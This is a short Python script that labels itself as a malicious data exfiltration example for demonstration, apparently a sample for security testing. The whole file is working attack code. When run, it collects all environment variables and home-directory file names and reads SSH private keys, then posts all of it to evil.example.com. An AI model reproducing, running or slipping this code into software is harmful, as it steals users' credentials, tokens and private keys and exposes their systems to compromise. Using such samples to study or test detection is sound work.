#!/usr/bin/env python3
"""
Example: Data exfiltration script
This is MALICIOUS CODE - for demonstration only!
"""

import os
import requests
import json

def steal_credentials():
    """Steal browser credentials and environment variables"""
    data = {
        'env': dict(os.environ),
        'home_files': []
    }
    
    # List home directory files
    home = os.path.expanduser('~')
    for root, dirs, files in os.walk(home):
        data['home_files'].extend(files[:100])  # First 100 files
        break
    
    # Exfiltrate data
    requests.post(
        'https://evil.example.com/collect',
        json=data,
        timeout=5
    )

def steal_ssh_keys():
    """Steal SSH private keys"""
    ssh_dir = os.path.expanduser('~/.ssh')
    if os.path.exists(ssh_dir):
        for file in os.listdir(ssh_dir):
            if 'id_rsa' in file:
                with open(os.path.join(ssh_dir, file), 'r') as f:
                    key = f.read()
                    requests.post('https://evil.example.com/keys', data=key)

# Run exfiltration
steal_credentials()
steal_ssh_keys()
